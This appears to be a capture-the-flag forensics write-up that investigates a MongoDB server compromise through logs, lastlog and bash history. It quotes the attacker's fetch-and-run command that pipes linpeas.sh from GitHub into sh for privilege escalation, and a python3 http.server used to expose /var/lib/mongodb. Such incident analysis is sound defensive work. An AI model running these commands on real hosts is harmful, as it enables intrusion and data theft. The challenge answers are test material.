# MangoBleed

## 1 What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

> **ANSWER:** CVE-2025-14847

## 2 What is the version of MongoDB installed on the server that the CVE exploited?

```sh
$ rg mongo live_response/packages/dpkg_-l.txt
446:ii  mongodb-database-tools             100.14.0                                amd64        mongodb-database-tools package provides tools for working with the MongoDB server:
447:ii  mongodb-mongosh                    2.5.10                                  amd64        MongoDB Shell CLI REPL Package
448:ii  mongodb-org                        8.0.16                                  amd64        MongoDB open source document-oriented database system (metapackage)
449:ii  mongodb-org-database               8.0.17                                  amd64        MongoDB open source document-oriented database system (metapackage)
450:ii  mongodb-org-database-tools-extra   8.0.17                                  amd64        Extra MongoDB database tools
451:ii  mongodb-org-mongos                 8.0.16                                  amd64        MongoDB sharded cluster query router
452:ii  mongodb-org-server                 8.0.16                                  amd64        MongoDB database server
453:ii  mongodb-org-shell                  8.0.16                                  amd64        MongoDB shell client
454:ii  mongodb-org-tools                  8.0.16                                  amd64        MongoDB tools
```

The `mongodb-org-server` version is `8.0.16`.

> **ANSWER:** 8.0.16

## 3 Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

```sh
$ ls **/*mongo**log
root/var/log/mongodb/mongod.log
```

Looking at `[root]/var/log/mongodb/mongod.log`, we see many instances of the same IP address.

```sh
$ rg 'Connection accepted' root/var/log/mongodb/mongod.log | jq '.attr.remote' | cut -d: -f1 | sort | uniq -c
  37630 "65.0.76.43
```

> **ANSWER:** 65.0.76.43

## 4 Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

```sh
$ rg -F '65.0.76.43' mongod.log | head -1 | jq -r '.t.["$date"]'
2025-12-29T05:25:52.743+00:00
```

> **ANSWER:** 2025-12-29 05:25:52

## 5 Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

```sh
$ rg -Fc '65.0.76.43' mongod.log
75260
```

> **ANSWER:** 75260

## 6 The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

In `live_response/system/lastlog.txt`, we find 3 logins.

```sh
$ rg pts lastlog.txt
2:root             pts/0    119.73.124.129                            Mon Dec 29 06:00:32 +0000 2025
36:ubuntu           pts/0    119.73.124.129                            Mon Dec 29 05:07:42 +0000 2025
38:mongoadmin       pts/0    65.0.76.43                                Mon Dec 29 05:40:03 +0000 2025
```

As the exploit targets MongoDB and the attacker IP is `65.0.76.43`, we take the `mongoadmin` session.

> **ANSWER:** 2025-12-29 05:40:03

## 7 Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

Knowing the compromised user, we can check their logs.
In `[root]/home/mongoadmin/.bash_history` are the commands run by the attacker.

> **ANSWER:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

## 8 The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

Also in the `.bash_history`, we find `python3 -m http.server 6969` as well as the `cd`s before it, giving us the exfiltrated directory.

> **ANSWER:** `/var/lib/mongodb`
